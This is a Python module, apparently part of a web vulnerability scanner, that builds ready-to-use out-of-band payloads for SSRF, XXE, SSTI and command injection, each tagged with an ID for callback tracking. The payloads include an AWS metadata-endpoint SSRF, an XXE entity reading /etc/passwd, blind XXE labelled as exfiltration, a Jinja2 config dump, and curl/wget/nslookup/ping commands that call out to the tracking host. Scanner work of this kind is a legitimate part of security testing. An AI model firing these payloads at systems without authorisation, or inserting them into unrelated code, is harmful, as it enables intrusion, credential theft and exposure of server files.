"""
OOB payload generator — SSRF / XXE / SSTI / RCE templates.
Each payload embeds a unique interaction_id for phantom-grid tracking.
"""

from typing import Dict, List


def generate_ssrf_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
    """HTTP/DNS SSRF payloads pointing to phantom-grid."""
    base = f"{grid_host}/{interaction_id}"
    dns = f"{interaction_id}.{grid_host}"
    return [
        {
            "type": "ssrf_http",
            "payload": f"http://{base}",
            "description": "Basic HTTP SSRF — phantom-grid callback",
        },
        {
            "type": "ssrf_https",
            "payload": f"https://{base}",
            "description": "HTTPS SSRF",
        },
        {
            "type": "ssrf_dns",
            "payload": f"http://{dns}",
            "description": "DNS-based SSRF — triggers OOB DNS lookup",
        },
        {
            "type": "ssrf_169",
            "payload": "http://169.254.169.254/latest/meta-data/",
            "description": "AWS metadata SSRF",
        },
    ]


def generate_xxe_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
    """Blind XXE payloads with OOB DNS/HTTP exfil."""
    url = f"http://{grid_host}/{interaction_id}"
    return [
        {
            "type": "xxe_oob_http",
            "payload": f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{url}">
]>
<root>&xxe;</root>""",
            "description": "Blind XXE — HTTP OOB to phantom-grid",
        },
        {
            "type": "xxe_oob_dns",
            "payload": f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{interaction_id}.{grid_host}/">
  %xxe;
]>
<root/>""",
            "description": "Blind XXE — DNS OOB exfil",
        },
        {
            "type": "xxe_file_read",
            "payload": """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
            "description": "XXE local file read — /etc/passwd",
        },
    ]


def generate_ssti_payloads() -> List[Dict[str, str]]:
    """SSTI detection payloads for common template engines."""
    return [
        {
            "type": "ssti_jinja2",
            "payload": "{{7*7}}",
            "expected": "49",
            "description": "Jinja2/Twig SSTI — expect 49 in response",
        },
        {
            "type": "ssti_jinja2_config",
            "payload": "{{config}}",
            "expected": "Config",
            "description": "Jinja2 config dump",
        },
        {
            "type": "ssti_freemarker",
            "payload": "${7*7}",
            "expected": "49",
            "description": "FreeMarker / Spring SSTI",
        },
        {
            "type": "ssti_erb",
            "payload": "<%= 7*7 %>",
            "expected": "49",
            "description": "Ruby ERB SSTI",
        },
        {
            "type": "ssti_smarty",
            "payload": "{$smarty.version}",
            "expected": "Smarty",
            "description": "Smarty SSTI",
        },
    ]


def generate_rce_oob_payloads(grid_host: str, interaction_id: str) -> List[Dict[str, str]]:
    """OOB RCE confirmation payloads via DNS/HTTP callback."""
    url = f"http://{grid_host}/{interaction_id}"
    return [
        {
            "type": "rce_curl",
            "payload": f"curl {url}",
            "description": "RCE via curl — HTTP callback to phantom-grid",
        },
        {
            "type": "rce_wget",
            "payload": f"wget -q {url}",
            "description": "RCE via wget",
        },
        {
            "type": "rce_dns_nslookup",
            "payload": f"nslookup {interaction_id}.{grid_host}",
            "description": "RCE — DNS OOB via nslookup",
        },
        {
            "type": "rce_dns_ping",
            "payload": f"ping -c1 {interaction_id}.{grid_host}",
            "description": "RCE — DNS OOB via ping",
        },
    ]


def get_all_payloads(grid_host: str, interaction_id: str) -> Dict[str, List[Dict[str, str]]]:
    """Return all payload categories keyed by type."""
    return {
        "ssrf": generate_ssrf_payloads(grid_host, interaction_id),
        "xxe": generate_xxe_payloads(grid_host, interaction_id),
        "ssti": generate_ssti_payloads(),
        "rce": generate_rce_oob_payloads(grid_host, interaction_id),
    }
